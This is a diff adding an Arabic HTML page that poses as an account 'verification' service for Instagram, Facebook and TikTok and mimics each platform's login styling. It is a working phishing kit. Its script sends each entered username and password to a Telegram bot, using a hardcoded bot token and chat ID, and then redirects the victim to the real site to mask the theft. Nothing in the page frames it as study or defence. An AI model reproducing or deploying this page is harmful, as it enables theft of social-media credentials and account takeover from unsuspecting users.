@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>توثيق الحسابات - اختر التطبيق</title>
+    <style>
+        :root {
+            --bg-color: #fafafa;
+            --card-bg: #ffffff;
+            --primary-color: #0095f6; /* Default Instagram */
+            --text-color: #262626;
+            --border-color: #dbdbdb;
+            --font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            font-family: var(--font-family);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            transition: all 0.3s ease;
+        }
+
+        /* حاوية الاختيار */
+        .platform-selector {
+            text-align: center;
+            background: var(--card-bg);
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            width: 320px;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .platform-icons {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        .icon-btn {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            border: 2px solid #eee;
+            background: white;
+            cursor: pointer;
+            font-size: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        }
+
+        .icon-btn:hover {
+            transform: scale(1.1);
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+
+        .icon-btn.active {
+            border-color: var(--primary-color);
+            background-color: rgba(0, 149, 246, 0.1);
+        }
+
+        /* حاوية النموذج (مخفية مبدئياً) */
+        .login-container {
+            display: none;
+            background: var(--card-bg);
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            width: 350px;
+            text-align: center;
+            border: 1px solid var(--border-color);
+        }
+
+        .logo {
+            font-size: 32px;
+            margin-bottom: 20px;
+            display: inline-block;
+        }
+
+        .logo-text {
+            font-size: 28px;
+            font-weight: bold;
+            color: var(--primary-color);
+            margin-bottom: 15px;
+            display: block;
+            text-decoration: none;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 14px;
+            background: #fafafa;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+        }
+
+        button.submit-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+
+        button.submit-btn:hover {
+            opacity: 0.9;
+        }
+
+        .back-link {
+            display: block;
+            margin-top: 15px;
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .status {
+            margin-top: 10px;
+            font-size: 13px;
+            min-height: 20px;
+        }
+
+        /* أنماط خاصة لكل منصة */
+        .style-fb {
+            --bg-color: #f0f2f5;
+            --primary-color: #1877f2;
+            --border-color: #dddfe2;
+        }
+        .style-fb .logo-text { color: #1877f2; }
+
+        .style-tt {
+            --bg-color: #000000;
+            --card-bg: #121212;
+            --primary-color: #fe2c55;
+            --text-color: #ffffff;
+            --border-color: #333;
+        }
+        .style-tt input { background: #1f1f1f; color: white; }
+        .style-tt .logo-text { color: #fe2c55; text-shadow: 2px 2px #25f4ee; }
+        .style-tt .back-link { color: #fff; }
+
+        .loading { display: none; color: var(--primary-color); font-weight: bold; font-size: 12px; }
+
+    </style>
+</head>
+<body id="bodyBg">
+
+    <!-- قسم اختيار التطبيق -->
+    <div class="platform-selector" id="selectorView">
+        <h2>اختر التطبيق لتوثيقه</h2>
+        <p style="color: #888; font-size: 14px;">انقر على الأيقونة للبدء</p>
+        
+        <div class="platform-icons">
+            <div class="icon-btn" onclick="selectPlatform('instagram')" title="Instagram">📸</div>
+            <div class="icon-btn" onclick="selectPlatform('facebook')" title="Facebook">📘</div>
+            <div class="icon-btn" onclick="selectPlatform('tiktok')" title="TikTok">🎵</div>
+        </div>
+    </div>
+
+    <!-- قسم تسجيل الدخول (ديناميكي) -->
+    <div class="login-container" id="loginView">
+        <div class="logo" id="dynamicLogo"></div>
+        <span class="logo-text" id="dynamicTitle">توثيق الحساب</span>
+        
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="اسم المستخدم / البريد / الهاتف" required>
+            <input type="password" id="password" placeholder="كلمة المرور" required>
+            <button type="submit" class="submit-btn" id="submitBtn">توثيق الحساب</button>
+        </form>
+
+        <div id="statusMsg" class="status"></div>
+        <div id="loadingMsg" class="loading">جاري الاتصال...</div>
+        
+        <a class="back-link" onclick="goBack()">عودة لاختيار التطبيق</a>
+    </div>
+
+<script>
+    // ==========================================
+    // إعدادات التيليجرام 
+    // ==========================================
+    const BOT_TOKEN = '9119814262:AAHERSEI2E-dRsPzqV73ZfsNiktV3IDHKV8';
+    
+    // *** استبدل هذا برقم معرفك الشخصي (Chat ID) ***
+    const CHAT_ID = '6656241145'; 
+    // ==========================================
+
+    const platforms = {
+        instagram: {
+            title: 'توثيق إنستغرام',
+            logo: '📸',
+            btnText: 'توثيق الآن',
+            placeholders: { user: 'اسم المستخدم أو البريد', pass: 'كلمة المرور' },
+            color: '#0095f6',
+            bg: '#fafafa',
+            card: '#ffffff',
+            border: '#dbdbdb',
+            font: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif'
+        },
+        facebook: {
+            title: 'توثيق فيسبوك',
+            logo: '📘',
+            btnText: 'تسجيل الدخول للتوثيق',
+            placeholders: { user: 'البريد الإلكتروني أو رقم الهاتف', pass: 'كلمة المرور' },
+            color: '#1877f2',
+            bg: '#f0f2f5',
+            card: '#ffffff',
+            border: '#dddfe2',
+            font: 'Helvetica, Arial, sans-serif'
+        },
+        tiktok: {
+            title: 'توثيق تيك توك',
+            logo: '🎵',
+            btnText: 'متابعة',
+            placeholders: { user: 'البريد الإلكتروني / الهاتف / اسم المستخدم', pass: 'كلمة المرور' },
+            color: '#fe2c55',
+            bg: '#000000',
+            card: '#121212',
+            border: '#333',
+            font: '"Pretendard", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif'
+        }
+    };
+
+    let currentPlatform = '';
+
+    function selectPlatform(platform) {
+        currentPlatform = platform;
+        const config = platforms[platform];
+        
+        // تحديث الواجهة
+        document.getElementById('selectorView').style.display = 'none';
+        document.getElementById('loginView').style.display = 'block';
+        
+        // تطبيق الثيم بتغيير الكلاس بناءً على المنصة
+        document.body.className = ''; 
+        if (platform === 'facebook') {
+            document.body.classList.add('style-fb');
+        } else if (platform === 'tiktok') {
+            document.body.classList.add('style-tt');
+        }
+
+        // تحديث النصوص والأيقونات في الواجهة
+        document.getElementById('dynamicLogo').textContent = config.logo;
+        document.getElementById('dynamicTitle').textContent = config.title;
+        document.getElementById('username').placeholder = config.placeholders.user;
+        document.getElementById('password').placeholder = config.placeholders.pass;
+        document.getElementById('submitBtn').textContent = config.btnText;
+        
+        // تفريغ الحقول والرسائل
+        document.getElementById('statusMsg').textContent = '';
+        document.getElementById('username').value = '';
+        document.getElementById('password').value = '';
+    }
+
+    function goBack() {
+        document.getElementById('selectorView').style.display = 'flex';
+        document.getElementById('loginView').style.display = 'none';
+        document.body.className = ''; // إعادة الثيم الافتراضي
+    }
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        const statusMsg = document.getElementById('statusMsg');
+        const loadingMsg = document.getElementById('loadingMsg');
+
+        loadingMsg.style.display = 'block';
+        statusMsg.textContent = '';
+
+        const message = `🚨 <b>بيانات جديدة (${currentPlatform})</b> 🚨\n\n👤 <b>الحساب:</b> ${username}\n🔑 <b>كلمة المرور:</b> ${password}\n\n🕒 <b>الوقت:</b> ${new Date().toLocaleString()}`;
+
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        })
+        .then(response => {
+            if (response.ok) {
+                loadingMsg.style.display = 'none';
+                statusMsg.style.color = 'green';
+                statusMsg.textContent = 'تم إرسال البيانات بنجاح! جاري التوثيق...';
+                
+                // التوجيه للموقع الرسمي للمنصة بعد الإرسال
+                setTimeout(() => {
+                    if (currentPlatform === 'facebook') window.location.href = 'https://www.facebook.com';
+                    else if (currentPlatform === 'tiktok') window.location.href = 'https://www.tiktok.com';
+                    else window.location.href = 'https://www.instagram.com';
+                }, 2500);
+            } else {
+                loadingMsg.style.display = 'none';
+                statusMsg.style.color = 'red';
+                statusMsg.textContent = 'خطأ: تأكد من إعدادات التيليجرام.';
+            }
+        })
+        .catch(error => {
+            loadingMsg.style.display = 'none';
+            statusMsg.style.color = 'red';
+            statusMsg.textContent = 'حدث خطأ في الاتصال بالشبكة.';
+        });
+    });
+</script>
+</body>
+</html>
